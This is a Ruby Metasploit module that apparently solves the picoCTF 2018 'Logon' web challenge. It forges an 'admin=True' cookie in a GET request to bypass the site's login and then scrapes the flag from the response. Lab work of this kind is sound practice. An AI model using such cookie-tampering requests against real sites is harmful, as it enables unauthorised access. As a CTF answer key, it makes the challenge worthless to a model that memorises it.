#!/usr/bin/env ruby

require 'msf/core'  # Metasploit module

class MetasploitModule < Msf::Auxiliary

  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient

  def initialize
    super(
      'Name'        => 'Web Explotation: Logon - Points: 150',
      'Description' => %q(
                        I made a website so now you can log on to! I don't seem to have the admin password. See if you can't get to the flag. http://2018shell2.picoctf.com:57252

                        [HINTS]:
                          Hmm it doesn't seem to check anyone's password, except for admins? How does check the admin's password?
                        ),
      'Author'      => ['CosasDePuma <https://github.com/cosasdepuma>'],
      'Privileged'  => 'false',
      'License'     => MSF_LICENSE
    )

    deregister_options('Proxies', 'VHOST', 'SSL')

    deregister_options(                           # Advanced Options
      'DOMAIN', 'DigestAuthIIS', 'FingerprintCheck', 'HttpClientTimeout',
      'HttpPassword', 'HttpTrace', 'HttpUsername', 'SSLVersion', 'WORKSPACE'
    )

    register_options(
      [
        Opt::RHOST('2018shell2.picoctf.com'),
        Opt::RPORT('57252'),

        OptString.new('TARGETURI', [true, 'URI to the site (e.g /site/) or a valid file resource (e.g /welcome.png)', '/flag'])
      ], self.class
    )
  end

  def run
    begin
      # Send a GET request to the server
      print_status("Sending GET request to TCP/#{rport} #{target_uri}...")
      res = send_request_cgi({
        'uri'     => target_uri.path,
        'method'  => 'GET',
        'headers' => {
          'Cookie'  =>  'admin=True'
        }
      })
      # Get the body of the request
      html_source = res.get_html_document.to_s
      flag = html_source.scan(/picoCTF{.*}/)[0]
      print_good("Solved: #{flag}")
    rescue
      # Handle errors
      print_error('Unhandled exception during execution')
    end
  end

end
